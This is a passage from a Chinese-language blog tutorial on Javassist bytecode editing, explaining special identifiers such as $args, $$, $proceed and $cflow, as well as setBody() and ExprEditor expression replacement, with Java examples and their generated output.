<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">G5_CtMethod_Learn$Test</span> &#123;</span><br><span class="line">    G5_CtMethod_Learn$Test() &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">add</span><span class="params">(<span class="type">int</span> a, <span class="type">int</span> b)</span> &#123;</span><br><span class="line">        System.out.println(<span class="built_in">this</span>.getClass().getName());</span><br><span class="line">        System.out.println(<span class="string">&quot;first num:&quot;</span> + a);</span><br><span class="line">        System.out.println(<span class="string">&quot;second num:&quot;</span> + b);</span><br><span class="line">        System.out.println(a + b);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h4 id="args"><a href="#args" class="headerlink" title="$args"></a>$args</h4><p>方法参数数组。它的类型为 <code>Object[]</code>，如果参数类型是基本数据类型（int，char等），则该参数值将转换为包装器对象（如 java.lang.Integer）存在 args 中。当第一个数据类型不是基本数据类型时，args[0] 即为 $1（不是 $0，因为 $0 是 this）</p>
<p>此外，javassist 不会进行装包和拆包，Integer 数据类型不能直接进行四则运算。</p>
<p>我们将之前的代码改为如下</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line">        <span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">cc</span> <span class="operator">=</span> pool.get(<span class="string">&quot;G5_CtMethod_Learn$Test&quot;</span>);</span><br><span class="line">        <span class="type">CtMethod</span> <span class="variable">m</span> <span class="operator">=</span> cc.getDeclaredMethod(<span class="string">&quot;add&quot;</span>);</span><br><span class="line"><span class="comment">//        m.insertBefore(&quot;&#123; System.out.println($0.getClass().getName());System.out.println(\&quot;first num:\&quot;+$1);\nSystem.out.println(\&quot;second num:\&quot;+$2);&#125;&quot;);</span></span><br><span class="line">        m.insertBefore(<span class="string">&quot;&#123; System.out.println(java.util.Arrays.toString($args));\nSystem.out.println($args[0]+$args[1]);&#125;&quot;</span>);</span><br><span class="line">        cc.writeFile(<span class="string">&quot;javassist_learn/src/main/java/class_repository&quot;</span>);</span><br><span class="line"></span><br><span class="line">        Class&lt;?&gt; aClass = cc.toClass();</span><br><span class="line">        <span class="type">Object</span> <span class="variable">instance</span> <span class="operator">=</span> aClass.newInstance();</span><br><span class="line">        aClass.getDeclaredMethod(<span class="string">&quot;add&quot;</span>, <span class="type">int</span>.class, <span class="type">int</span>.class).invoke(instance, <span class="number">10</span>, <span class="number">20</span>);</span><br></pre></td></tr></table></figure></div>

<p>生成的代码为：</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">void</span> <span class="title function_">add</span><span class="params">(<span class="type">int</span> a, <span class="type">int</span> b)</span> &#123;</span><br><span class="line">        System.out.println(Arrays.toString(<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="keyword">new</span> <span class="title class_">Integer</span>(a), <span class="keyword">new</span> <span class="title class_">Integer</span>(b)&#125;));</span><br><span class="line">        System.out.println(String.valueOf((<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="keyword">new</span> <span class="title class_">Integer</span>(a), <span class="keyword">new</span> <span class="title class_">Integer</span>(b)&#125;)[<span class="number">0</span>]).concat(String.valueOf((<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="keyword">new</span> <span class="title class_">Integer</span>(a), <span class="keyword">new</span> <span class="title class_">Integer</span>(b)&#125;)[<span class="number">1</span>])));</span><br><span class="line">        System.out.println(a + b);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></div>

<p>我们可以发现，首先 int 这种基本数据类型确实转换为了包装类，此外，当我们对 Integer 对象进行 <code>+</code> 运算时，转换的字节码则是转化为了字符串拼接，而不是整数的加运算。</p>
<h4 id="，-proceed"><a href="#，-proceed" class="headerlink" title="$$，$proceed"></a>$$，$proceed</h4><p>变量 $$ 是所有参数列表的缩写，用逗号分隔。</p>
<p>将之前的代码改为如下</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;</span><br><span class="line"><span class="keyword">import</span> javassist.CtMethod;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">G5_CtMethod_Learn</span> &#123;</span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">Test</span>&#123;</span><br><span class="line">        <span class="keyword">void</span> <span class="title function_">add</span><span class="params">(<span class="type">int</span> a, <span class="type">int</span> b)</span>&#123;</span><br><span class="line">            System.out.println(a + b);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">void</span> <span class="title function_">sub</span><span class="params">(<span class="type">int</span> a, <span class="type">int</span> b)</span>&#123;</span><br><span class="line">            System.out.println(Math.abs(a-b));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Throwable&#123;</span><br><span class="line">        <span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">cc</span> <span class="operator">=</span> pool.get(<span class="string">&quot;G5_CtMethod_Learn$Test&quot;</span>);</span><br><span class="line">        <span class="type">CtMethod</span> <span class="variable">m</span> <span class="operator">=</span> cc.getDeclaredMethod(<span class="string">&quot;add&quot;</span>);</span><br><span class="line">        m.insertBefore(<span class="string">&quot;&#123; sub($$);&#125;&quot;</span>);</span><br><span class="line"></span><br><span class="line">        cc.writeFile(<span class="string">&quot;javassist_learn/src/main/java/class_repository&quot;</span>);</span><br><span class="line"></span><br><span class="line">        Class&lt;?&gt; aClass = cc.toClass();</span><br><span class="line">        <span class="type">Object</span> <span class="variable">instance</span> <span class="operator">=</span> aClass.newInstance();</span><br><span class="line">        aClass.getDeclaredMethod(<span class="string">&quot;add&quot;</span>, <span class="type">int</span>.class, <span class="type">int</span>.class).invoke(instance, <span class="number">10</span>, <span class="number">20</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>生成的 class 文件内容如下：</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">G5_CtMethod_Learn$Test</span> &#123;</span><br><span class="line">    G5_CtMethod_Learn$Test() &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">add</span><span class="params">(<span class="type">int</span> a, <span class="type">int</span> b)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.sub(a, b);</span><br><span class="line">        System.out.println(a + b);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">sub</span><span class="params">(<span class="type">int</span> a, <span class="type">int</span> b)</span> &#123;</span><br><span class="line">        System.out.println(Math.abs(a - b));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>可以与其他方法一起使用。</p>
<p>假如写：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">exFunc($$, context)</span><br></pre></td></tr></table></figure></div>

<p>等价于（由于 add 函数只有两个参数，所以 $$ 也只会生成两个，根据调用的函数参数数量确定）</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line">exFunc($<span class="number">1</span>, $<span class="number">2</span>, context)</span><br></pre></td></tr></table></figure></div>



<p>$proceed 表示的是调用原始方法，可以配合 $$ 表示原本方法</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line">$proceed($$)</span><br></pre></td></tr></table></figure></div>



<h4 id="cflow"><a href="#cflow" class="headerlink" title="$cflow"></a>$cflow</h4><p><code>$cflow</code> 表示控制流。该变量是只读变量，会返回特定方法的递归调用的深度。</p>
<p>调用 $cflow 监视 fact() 方法的调用：</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line"><span class="type">CtClass</span> <span class="variable">cc</span> <span class="operator">=</span> pool.get(<span class="string">&quot;G5_CtMethod_Learn$Test&quot;</span>);</span><br><span class="line"><span class="type">CtMethod</span> <span class="variable">m</span> <span class="operator">=</span> cc.getDeclaredMethod(<span class="string">&quot;fact&quot;</span>);</span><br><span class="line">m.useCflow(<span class="string">&quot;fact&quot;</span>);</span><br><span class="line">m.insertBefore(<span class="string">&quot;&#123; System.out.println(\&quot;函数递归深度：\&quot;+$cflow(fact));&#125;&quot;</span>);</span><br><span class="line">cc.writeFile(<span class="string">&quot;javassist_learn/src/main/java/class_repository&quot;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Class&lt;?&gt; aClass = cc.toClass();</span><br><span class="line"><span class="type">Object</span> <span class="variable">instance</span> <span class="operator">=</span> aClass.newInstance();</span><br><span class="line">aClass.getDeclaredMethod(<span class="string">&quot;fact&quot;</span>,<span class="type">int</span>.class).invoke(instance,<span class="number">5</span>);</span><br></pre></td></tr></table></figure></div>

<p>为 Test 新建一个循环函数</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">fact</span><span class="params">(<span class="type">int</span> n)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (n &lt;= <span class="number">1</span>)</span><br><span class="line">        <span class="keyword">return</span> n;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="keyword">return</span> n * fact(n - <span class="number">1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>运行输出中看到：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">函数递归深度：0</span><br><span class="line">函数递归深度：1</span><br><span class="line">函数递归深度：2</span><br><span class="line">函数递归深度：3</span><br><span class="line">函数递归深度：4</span><br></pre></td></tr></table></figure></div>

<h4 id="r，"><a href="#r，" class="headerlink" title="$r，$_"></a>$r，$_</h4><p><code>$r</code> 函数的返回值类型</p>
<p><code>$_</code> 返回值</p>
<p><code>$_</code> 用于在 CtMethod 中的 insertAfter() 和 CtConstructor() 在方法的末尾插入编译的代码（insertBefore 等函数使用会产生报错），支持使用 <code>$1</code>,<code>$2</code>,<code>$_</code>等内容。</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">      <span class="type">CtClass</span> <span class="variable">cc</span> <span class="operator">=</span> pool.get(<span class="string">&quot;G5_CtMethod_Learn$Test&quot;</span>);</span><br><span class="line">      <span class="type">CtMethod</span> <span class="variable">m</span> <span class="operator">=</span>  cc.getDeclaredMethod(<span class="string">&quot;word&quot;</span>);</span><br><span class="line">      m.insertAfter(<span class="string">&quot;&#123;Object result = \&quot;hahaha\&quot;;$_=($r)result;&#125;&quot;</span>);</span><br><span class="line">      cc.writeFile(<span class="string">&quot;javassist_learn/src/main/java/class_repository&quot;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">      Class&lt;?&gt; aClass = cc.toClass();</span><br><span class="line">      <span class="type">Object</span> <span class="variable">instance</span> <span class="operator">=</span> aClass.newInstance();</span><br><span class="line">      System.out.println(aClass.getDeclaredMethod(<span class="string">&quot;word&quot;</span>).invoke(instance));</span><br></pre></td></tr></table></figure></div>

<p>word函数</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line">String <span class="title function_">word</span><span class="params">()</span>&#123;</span><br><span class="line">          <span class="keyword">return</span> <span class="string">&quot;1&quot;</span>;</span><br><span class="line">      &#125;</span><br></pre></td></tr></table></figure></div>

<p>运行后输出，发现能成功改变</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">hahaha</span><br></pre></td></tr></table></figure></div>



<h4 id="w"><a href="#w" class="headerlink" title="$w"></a>$w</h4><p>自动转换为对应的包装器类型，用于强制类型转换。当存在如下代码时</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Integer</span> <span class="variable">i</span> <span class="operator">=</span> ($w)<span class="number">5</span>;</span><br></pre></td></tr></table></figure></div>

<p>写入的class内容为：</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Integer</span> <span class="variable">i</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Integer</span>(<span class="number">5</span>);</span><br></pre></td></tr></table></figure></div>



<h4 id="sig"><a href="#sig" class="headerlink" title="$sig"></a>$sig</h4><p><code>$sig</code> 的值是一个 java.lang.Class 对象的数组，表示声明的形式参数类型。</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line">m.insertBefore(<span class="string">&quot;&#123;System.out.println(java.util.Arrays.toString($sig));&#125;&quot;</span>);</span><br></pre></td></tr></table></figure></div>

<p>产生的class内容如下：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">System.out.println(Arrays.toString(Desc.getParams(&quot;(II)&quot;)));</span><br></pre></td></tr></table></figure></div>

<p>输出的是个 Class 数组</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">[int,int]</span><br></pre></td></tr></table></figure></div>

<p>getParams 是 javassist.runtime.Desc 包下的，该方法接受一个方法描述符作为参数，然后返回一个字符串数组，其中包含了描述该方法参数类型的字符串。</p>
<p>该方法会解析方法描述符，提取出其中的参数类型信息，并将其转换为字符串数组返回。</p>
<ul>
<li><code>B</code>: byte 类型</li>
<li><code>C</code>: char 类型</li>
<li><code>D</code>: double 类型</li>
<li><code>F</code>: float 类型</li>
<li><code>I</code>: int 类型</li>
<li><code>J</code>: long 类型</li>
<li><code>S</code>: short 类型</li>
<li><code>Z</code>: boolean 类型</li>
<li><code>L&lt;full-classname&gt;;</code>: 对象引用类型，其中 <code>&lt;full-classname&gt;</code> 是类的完整路径名</li>
<li><code>[</code>: 数组类型</li>
</ul>
<p>所以上面转化的class文件中以下内容，实际上就是返回的是包含两个 int 类型的数组</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">Desc.getParams(&quot;(II)&quot;)</span><br></pre></td></tr></table></figure></div>



<h4 id="type"><a href="#type" class="headerlink" title="$type"></a>$type</h4><p>$type 的值是一个 java.lang.Class 对象，表示函数返回值的类型。 如果这是一个构造函数，此变量返回 Void.class。</p>
<p>和上面的 <code>$sig</code> 差不多，但是其调用的方法是 Desc.getType，比如 Desc.getType(“V”) 表示的返回值类型是 void</p>
<h4 id="class"><a href="#class" class="headerlink" title="$class"></a>$class</h4><p>用于引用当前正在编辑的类的类型，通常在添加字段或方法时使用。与 <code>$0</code> 有点相似</p>
<h4 id="e，addCatch"><a href="#e，addCatch" class="headerlink" title="$e，addCatch()"></a><code>$e</code>，addCatch()</h4><p> 在插入的源代码中，异常用 $e 表示。</p>
<p>测试代码</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">test4</span><span class="params">()</span> <span class="keyword">throws</span> Throwable &#123;</span><br><span class="line">       <span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">       <span class="type">CtClass</span> <span class="variable">cc</span> <span class="operator">=</span> pool.get(<span class="string">&quot;G5_CtMethod_Learn$Test&quot;</span>);</span><br><span class="line">       <span class="type">CtMethod</span> <span class="variable">m</span> <span class="operator">=</span> cc.getDeclaredMethod(<span class="string">&quot;word&quot;</span>);</span><br><span class="line">       <span class="type">CtClass</span> <span class="variable">etype</span> <span class="operator">=</span> ClassPool.getDefault().get(<span class="string">&quot;java.io.IOException&quot;</span>);</span><br><span class="line">       m.addCatch(<span class="string">&quot;&#123; System.out.println($e); throw $e; &#125;&quot;</span>, etype);</span><br><span class="line">       cc.writeFile(<span class="string">&quot;javassist_learn/src/main/java/class_repository&quot;</span>);</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure></div>

<p>写入的class 内容如下</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line">String <span class="title function_">word</span><span class="params">()</span> &#123;</span><br><span class="line">       <span class="keyword">try</span> &#123;</span><br><span class="line">           <span class="keyword">return</span> <span class="string">&quot;1&quot;</span>;	<span class="comment">// 原本的内容</span></span><br><span class="line">       &#125; <span class="keyword">catch</span> (IOException var2) &#123;</span><br><span class="line">           System.out.println(var2);</span><br><span class="line">           <span class="keyword">throw</span> var2;</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure></div>

<p>可以发现原本的类方法在 try 块中，而通过 addCatch 的内容添加在了 catch 块中。</p>
<p>还需要注意，插入的代码片段必须以 throw 或 return 语句结束。</p>
<h3 id="修改方法体"><a href="#修改方法体" class="headerlink" title="修改方法体"></a>修改方法体</h3><p>CtMethod 和 CtConstructor 提供 setBody() 来替换整个方法体。他将新的源代码编译成 Java  字节码，并用它替换原方法体。 如果给定的源文本为 null，则替换后的方法体仅包含返回语句，返回零或空值，除非结果类型为 void。</p>
<p>在传递给 setBody() 的源代码中，以 $ 开头的标识符也具有特殊含义，处理方式与上面的提到的内容一致（但是 <code>$_</code> 不可用）。</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;</span><br><span class="line"><span class="keyword">import</span> javassist.CtMethod;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">G5_CtMethod_Learn_SetBody</span> &#123;</span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">Test</span> &#123;</span><br><span class="line">        <span class="keyword">void</span> <span class="title function_">add</span><span class="params">(<span class="type">int</span> a, <span class="type">int</span> b)</span> &#123;</span><br><span class="line">            System.out.println(a + b);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Throwable &#123;</span><br><span class="line">        <span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">cc</span> <span class="operator">=</span> pool.get(<span class="string">&quot;G5_CtMethod_Learn_SetBody$Test&quot;</span>);</span><br><span class="line">        <span class="type">CtMethod</span> <span class="variable">m</span> <span class="operator">=</span> cc.getDeclaredMethod(<span class="string">&quot;add&quot;</span>);</span><br><span class="line">        m.setName(<span class="string">&quot;mul&quot;</span>);</span><br><span class="line">        m.setBody(<span class="string">&quot;&#123;System.out.println($1 * $2);&#125;&quot;</span>);</span><br><span class="line">        cc.writeFile(<span class="string">&quot;javassist_learn/src/main/java/class_repository&quot;</span>);</span><br><span class="line">        Class&lt;?&gt; aClass = cc.toClass();</span><br><span class="line">        <span class="type">Object</span> <span class="variable">instance</span> <span class="operator">=</span> aClass.newInstance();</span><br><span class="line">        aClass.getDeclaredMethod(<span class="string">&quot;mul&quot;</span>, <span class="type">int</span>.class, <span class="type">int</span>.class).invoke(instance, <span class="number">10</span>, <span class="number">20</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>



<h3 id="替换表达式"><a href="#替换表达式" class="headerlink" title="替换表达式"></a>替换表达式</h3><h4 id="javassist-expr-MethodCall"><a href="#javassist-expr-MethodCall" class="headerlink" title="javassist.expr.MethodCall"></a>javassist.expr.MethodCall</h4><p>Javassist 只允许修改方法体中包含的表达式。javassist.expr.ExprEditor 是一个用于替换方法体中的表达式的类。用户可以定义 ExprEditor 的子类来指定修改表达式的方式。</p>
<p>要运行 ExprEditor 对象，用户必须在 CtMethod 或 CtClass 中调用 instrument()。</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">Test</span> &#123;</span><br><span class="line">       <span class="keyword">void</span> <span class="title function_">add</span><span class="params">(<span class="type">int</span> a, <span class="type">int</span> b)</span> &#123;</span><br><span class="line">           System.out.println(a + b);</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">       <span class="type">int</span> <span class="title function_">square</span><span class="params">(<span class="type">int</span> a)</span>&#123;</span><br><span class="line">           System.out.println(a);</span><br><span class="line">           <span class="keyword">return</span> a*a;</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;</span><br><span class="line">   </span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Throwable &#123;</span><br><span class="line">       <span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">       <span class="type">CtClass</span> <span class="variable">cc</span> <span class="operator">=</span> pool.get(<span class="string">&quot;G5_CtMethod_Learn_EditBody$Test&quot;</span>);</span><br><span class="line">       <span class="type">CtMethod</span> <span class="variable">m</span> <span class="operator">=</span> cc.getDeclaredMethod(<span class="string">&quot;square&quot;</span>);</span><br><span class="line">       m.instrument(<span class="keyword">new</span> <span class="title class_">ExprEditor</span>() &#123;</span><br><span class="line">           <span class="meta">@Override</span></span><br><span class="line">           <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">edit</span><span class="params">(MethodCall mc)</span> <span class="keyword">throws</span> CannotCompileException &#123;</span><br><span class="line">               mc.replace(<span class="string">&quot;&#123; System.out.println(\&quot;&quot;</span>+mc.where().getName()+<span class="string">&quot;调用&quot;</span>+mc.getClassName()+<span class="string">&quot;类的方法: &quot;</span>+mc.getMethodName() +<span class="string">&quot;\&quot;);$1 = 10; $_ = $proceed($$); &#125;&quot;</span>);</span><br><span class="line">           &#125;</span><br><span class="line">       &#125;);</span><br><span class="line">       cc.writeFile(<span class="string">&quot;javassist_learn/src/main/java/class_repository&quot;</span>);</span><br><span class="line">       Class&lt;?&gt; aClass = cc.toClass();</span><br><span class="line">       <span class="type">Test</span> <span class="variable">instance</span> <span class="operator">=</span> (Test)aClass.getDeclaredConstructor().newInstance();</span><br><span class="line">       System.out.println(instance.square(<span class="number">5</span>));</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure></div>

<p>这里需要注意的是，这个方式修改的是调用的方法中存在的其他方法。比如上面代码寻找的是 square 方法，修改了 println 方法，也就是这个方法内的其他方法，$1 也是 println 的第一个参数，而不是 square 的第一个参数，这个需要注意一下；如果需要访问当前调用的方法名称，可以通过 <code>.where().getName()</code> 获取，比如上面的代码运行结果为：</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line">square调用java.io.PrintStream类的方法: println</span><br><span class="line"><span class="number">10</span>		<span class="comment">// $1 只修改了 println 的第一个参数的值，而不是修改的 a 的值</span></span><br><span class="line"><span class="number">25</span>		<span class="comment">// 这个是 square 的返回值，可以发现实际上传入的 a 值并没有变</span></span><br></pre></td></tr></table></figure></div>

<p> 调用 edit() 参数的 replace() 方法可以将表达式替换为我们给定的语句。如果给定的语句是空块，即执行replace(“{}”)，则将表达式删除。如果要在表达式之前或之后插入语句（或块），则应该将类似以下的代码传递给 replace()：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123; *before-statements;*</span><br><span class="line">  $_ = $proceed($$);</span><br><span class="line">  *after-statements;* &#125;</span><br></pre></td></tr></table></figure></div>

<p>直接点说也就是不想改的部分记得照写。</p>
<p>上述代码中的 MethodCall 类的 replace 方法和之前接触的 CtMethod 方法中 <code>$</code>  的作用是一样的（$0 表示方法调用的目标对象。它不等于 this，它代表了调用者。 如果方法是静态的，则 $0 为 null）。</p>
<p>除了 MethodCall 类，ExprEditor 的 edit 其实有许多的重构方法。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/blog/image-20240308144738048.png"
                      alt="image-20240308144738048"
                ></p>
<h4 id="javassist-expr-ConstructorCall"><a href="#javassist-expr-ConstructorCall" class="headerlink" title="javassist.expr.ConstructorCall"></a><strong>javassist.expr.ConstructorCall</strong></h4><p>ConstructorCall 表示构造函数调用，ConstructorCall 中的方法 replace() 可以使用语句或代码块来代替构造函数。它接收表示替换语句或块的源代码。以 $ 开头的标识符同样具有特殊的含义，具体同上。</p>
<p>由于任何构造函数必须调用超类的构造函数或同一类的另一个构造函数，所以替换语句必须包含构造函数调用，通常是对 $proceed() 的调用。否则会出现如下报错：</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line">Constructor must call <span class="title function_">super</span><span class="params">()</span> or <span class="title function_">this</span><span class="params">()</span> before <span class="keyword">return</span></span><br></pre></td></tr></table></figure></div>

<p>示例：</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Throwable &#123;</span><br><span class="line">    <span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">    <span class="type">CtClass</span> <span class="variable">cc</span> <span class="operator">=</span> pool.get(<span class="string">&quot;G5_CtMethod_Learn_EditBody$Test&quot;</span>);</span><br><span class="line">    <span class="type">CtConstructor</span> <span class="variable">ctConstructor</span> <span class="operator">=</span> cc.getDeclaredConstructor(<span class="literal">null</span>);</span><br><span class="line">    ctConstructor.instrument(<span class="keyword">new</span> <span class="title class_">ExprEditor</span>() &#123;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">edit</span><span class="params">(ConstructorCall cc)</span> <span class="keyword">throws</span> CannotCompileException &#123;</span><br><span class="line">            cc.replace(<span class="string">&quot;&#123;System.out.println(\&quot;Hello Ko1sh1\&quot;);$proceed($$);&#125;&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">    cc.writeFile(<span class="string">&quot;javassist_learn/src/main/java/class_repository&quot;</span>);</span><br><span class="line">    cc.toClass().getDeclaredConstructor().newInstance();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">Test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Test</span><span class="params">()</span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">add</span><span class="params">(<span class="type">int</span> a, <span class="type">int</span> b)</span> &#123;</span><br><span class="line">        System.out.println(a + b);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> <span class="title function_">square</span><span class="params">(<span class="type">int</span> a)</span>&#123;</span><br><span class="line">        System.out.println(a);</span><br><span class="line">        <span class="keyword">return</span> a*a;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>



<h4 id="javassist-expr-FieldAccess"><a href="#javassist-expr-FieldAccess" class="headerlink" title="javassist.expr.FieldAccess"></a>javassist.expr.FieldAccess</h4><p>FieldAccess 对象表示字段访问。 如果找到对应的字段访问操作，ExprEditor 中的 edit() 方法将接收到一个 FieldAccess 对象。FieldAccess 中的 replace() 方法接收替源代码来替换字段访问。</p>
<p>在源代码中，以 $ 开头的标识符具有特殊含义：</p>
<table>
<thead>
<tr>
<th>符号</th>
<th>含义</th>
</tr>
</thead>
<tbody><tr>
<td><code>$0</code></td>
<td>表达式访问的字段。它不等于 this。this 表示调用表达式所在方法的对象。如果字段是静态的，则 $0 为 null</td>
</tr>
<tr>
<td><code>$1</code></td>
<td>如果表达式是写操作，则写的值将保存在 $1中，否则 $1 不可用</td>
</tr>
<tr>
<td><code>$_</code></td>
<td>如果表达式是读操作，则结果值需要保存在 $_ 中的值，否则将舍弃 $_ 的值</td>
</tr>
<tr>
<td><code>$r</code></td>
<td>如果表达式是读操作，则 $r 表示读取的类型，否则 $r 为 void</td>
</tr>
<tr>
<td><code>$class</code></td>
<td>一个 java.lang.Class 对象，表示字段所在的类</td>
</tr>
<tr>
<td><code>$type</code></td>
